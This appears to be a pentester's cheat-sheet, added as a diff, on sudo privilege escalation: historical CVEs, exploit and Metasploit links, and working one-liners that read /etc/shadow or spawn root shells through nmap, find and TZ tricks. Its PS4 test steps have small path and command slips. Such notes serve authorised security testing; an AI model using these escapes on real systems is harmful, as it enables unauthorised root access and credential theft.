@@ -1,0 +1,61 @@
+# sudo
+
+Todd C. Miller is the main dev
+
+# sudoedit path not verified in sudo <= 1.7.2p5
+need local user with permission to run sudoedit
+
+# try run command that doesn't require password, if it fails it won't be logged
+sudo -n <command> 
+
+# tty_tickets (1.3.5-1.7.10 and 1.8.0-1.8.5) (CVE-2013-1776)
+https://gist.github.com/ryancdotorg/5136278 #exploit
+
+# env variables not sanitized (sudo <= 1.6.9p18)
+# env_reset must be disabled (!env_reset) or dangerous env vars must be whitelisted
+# PS4 trick. Added to blacklist in 1.6.8p10
+0511-exploits/sudo168p10.sh.txt (Nov 2005)
+# LD_PRELOAD trick
+0811-exploits/sudo-local.txt (Nov 2008)
+http://www.sensepost.com/blog/9108.html (2013)
+
+# can any of the allowed programs be overwritten/created?
+
+# sudo -k epoch bug (1.6.0-1.7.10p6 and 1.8.0-1.8.6p6)
+# msf module tested working on Mac OS 10.7-10.8.4 (patched in 10.9 beta)
+http://www.sudo.ws/sudo/alerts/epoch_ticket.html
+msf module: http://packetstormsecurity.com/files/122965 http://www.exploit-db.com/exploits/27944/
+chris l'a fait avec systemsetup mais utiliser dscl serait "plus simple"
+il faut etre un utilisateur interactif (uid < 500) pour avoir le droit d'executer systemsetup
+
+# CVE-2014-9680
+http://www.sudo.ws/alerts/tz.html
+
+# tricks & shell escapes
+$ TZ=/etc/shadow sudo -u root date
+
+$ nmap --interactive
+nmap> !id
+$ sudo nmap -iL /etc/shadow
+Failed to resolve “root:$6$tacL...
+
+$ sudo find /dev/null -exec id \; # shell escape
+uid=0(root) gid=0(root) groups=0(root)
+
+## sudo tests
+* how to test
+cat /opt/path/test.sh <<'EOF'
+#!/bin/bash
+echo "PS4: $PS4"
+EOF
+chmod +x /opt/patht/test.sh
+
+# visudo
+Defaults !env_reset
+john ALL=(root) /opt/path/test.sh
+
+$ sudo PS4=blah /opt/path/test.sh
+PS4: blah # sudo is vuln
+
+$ sudo PS4=blah /opt/path/test.sh
+PS4: + # sudo is NOT vuln
